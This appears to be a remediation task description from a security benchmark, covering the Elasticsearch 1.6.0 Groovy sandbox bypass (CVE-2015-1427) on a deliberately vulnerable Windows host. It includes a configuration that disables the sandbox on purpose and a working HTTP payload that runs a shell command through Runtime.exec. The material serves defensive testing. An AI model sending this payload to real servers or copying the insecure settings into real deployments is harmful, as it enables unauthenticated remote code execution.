# Elasticsearch 1.6.0 — Groovy Sandbox Bypass RCE (CVE-2015-1427)

## Severity
**Critical** (CVSS 9.8)

## CVE
**CVE-2015-1427** — Unauthenticated remote code execution via a Groovy
scripting-engine sandbox bypass in Elasticsearch 1.3.x–1.6.0 (fixed in 1.6.1).

## Description
Elasticsearch 1.4 replaced MVEL with Groovy as the dynamic-scripting language and
added a sandbox intended to restrict what scripted `_search` requests could do.
CVE-2015-1427 is a bypass of that sandbox — an attacker can craft a Groovy
expression that escapes into the underlying JVM and calls arbitrary classes like
`java.lang.Runtime` or `java.lang.ProcessBuilder`, achieving remote code execution
as the Elasticsearch service account.

This image runs Elasticsearch **1.6.0** (the last release before 1.6.1 closed the
bypass). We also explicitly disable the sandbox in `elasticsearch.yml`
(`script.groovy.sandbox.enabled: false`) and keep `script.disable_dynamic: false`
so that dynamic scripting is reachable. Binding to `0.0.0.0` means any caller that
can reach port 9200/TCP can exploit the RCE without credentials.

> **Why 1.6.0 and not 1.1.1?** The metasploitable3-windows upstream pins
> Elasticsearch 1.1.1 (CVE-2014-3120). On Server Core ltsc2019 the 1.1.1 JVM hits
> a native Lucene JNI crash at startup under every JRE we tested. ES 1.6.0 boots
> cleanly, targets the same `/_search` RCE attack surface, and lets the benchmark
> agent exercise exactly the same remediation skills.

## Affected Service
- **Service:** Elasticsearch 1.6.0 (standalone JVM, `elasticsearch.bat`)
- **Ports:** 9200/TCP (HTTP), 9300/TCP (node transport)
- **Config:** `C:\elasticsearch-1.6.0\config\elasticsearch.yml`

## Vulnerable Configuration
```yaml
# elasticsearch.yml
cluster.name: meta3-es
network.host: 0.0.0.0
http.port: 9200
script.disable_dynamic: false           # dynamic scripting ENABLED
script.groovy.sandbox.enabled: false    # Groovy sandbox DISABLED
```

## Proof
```
POST /_search?pretty HTTP/1.1
Host: <target>:9200
Content-Type: application/json

{
  "size": 1,
  "query": { "match_all": {} },
  "script_fields": {
    "rce": {
      "lang": "groovy",
      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cmd /c whoami\").getInputStream().text"
    }
  }
}
```
The response body contains the process stdout of `whoami`.

## Constraints
- This host has no outbound network access and no newer Elasticsearch distribution is staged on it.
- Elasticsearch must still answer `GET /` and `GET /_cluster/health` on 9200 when you are done; stopping the node is not an acceptable outcome.
